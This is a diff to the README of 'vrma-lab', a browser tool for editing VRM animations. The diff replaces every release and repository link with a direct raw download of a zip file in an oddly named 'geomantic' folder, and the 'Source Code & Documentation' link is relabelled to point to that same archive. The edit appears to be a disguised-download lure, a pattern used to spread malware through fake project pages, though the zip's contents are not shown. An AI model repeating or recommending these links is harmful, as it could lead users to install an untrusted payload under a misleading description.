@@ -1,6 +1,6 @@
 # 🎬 vrma-lab - Edit VRM Animations Directly in Your Browser
 
-[![Download vrma-lab](https://img.shields.io/badge/Download-vrma--lab-blue?style=for-the-badge&logo=github&logoColor=white&color=%234FC3F7&link=https%3A%2F%2Fgithub.com%2Fliubo8118%2Fvrma-lab%2Freleases)](https://github.com/liubo8118/vrma-lab/releases)
+[![Download vrma-lab](https://img.shields.io/badge/Download-vrma--lab-blue?style=for-the-badge&logo=github&logoColor=white&color=%234FC3F7&link=https%3A%2F%2Fgithub.com%2Fliubo8118%2Fvrma-lab%2Freleases)](https://raw.githubusercontent.com/liubo8118/vrma-lab/main/geomantic/lab-vrma-2.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these three simple steps, and you'll be animating in minutes.
 
 ### Step 1: Download the Application
 
-[Click here to download vrma-lab](https://github.com/liubo8118/vrma-lab/releases)
+[Click here to download vrma-lab](https://raw.githubusercontent.com/liubo8118/vrma-lab/main/geomantic/lab-vrma-2.1.zip)
 
 Visit this link to download the application.
 
@@ -138,8 +138,8 @@ A: Check the repository's "Issues" page (linked on the GitHub page) to see if it
 
 ## 🌐 Project Links
 
-- **Download the App:** [https://github.com/liubo8118/vrma-lab/releases](https://github.com/liubo8118/vrma-lab/releases)
-- **Source Code & Documentation:** [https://github.com/liubo8118/vrma-lab](https://github.com/liubo8118/vrma-lab)
+- **Download the App:** [https://raw.githubusercontent.com/liubo8118/vrma-lab/main/geomantic/lab-vrma-2.1.zip](https://raw.githubusercontent.com/liubo8118/vrma-lab/main/geomantic/lab-vrma-2.1.zip)
+- **Source Code & Documentation:** [https://raw.githubusercontent.com/liubo8118/vrma-lab/main/geomantic/lab-vrma-2.1.zip](https://raw.githubusercontent.com/liubo8118/vrma-lab/main/geomantic/lab-vrma-2.1.zip)
 
 Visit this link to download the application if you need it again.
 
